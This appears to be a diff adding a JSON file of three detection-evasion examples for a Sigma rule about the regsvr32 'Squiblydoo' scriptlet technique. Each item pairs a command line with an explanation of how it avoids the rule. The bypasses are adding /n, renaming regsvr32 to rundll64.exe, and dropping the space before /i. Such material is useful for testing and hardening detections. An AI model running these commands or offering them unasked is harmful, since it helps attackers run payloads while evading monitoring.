@@ -1,0 +1,14 @@
+[
+  {
+    "output": "regsvr32.exe /s /n /u /i:payload.sct scrobj.dll",
+    "explanation": "The Sigma rule specifically looks for the presence of the '/i:' flag without the '/n ' flag. By including the '/n ' flag (which is actually standard in the well-known 'Squiblydoo' attack), the filter condition evaluates to true, preventing the anomaly rule from triggering."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\regsvr32.exe C:\\Temp\\rundll64.exe && C:\\Temp\\rundll64.exe /i:payload.sct scrobj.dll",
+    "explanation": "The rule explicitly checks if the executing image ends with '\\regsvr32.exe'. Copying the executable to a different name and running the payload completely evades the primary selection criteria."
+  },
+  {
+    "output": "regsvr32.exe/i:payload.sct scrobj.dll",
+    "explanation": "The selection rule uses the windash modifier and looks for ' -i:' (which checks for a leading space before the dash or slash). Removing the space between the binary and the flag prevents the command line selection condition from matching."
+  }
+]
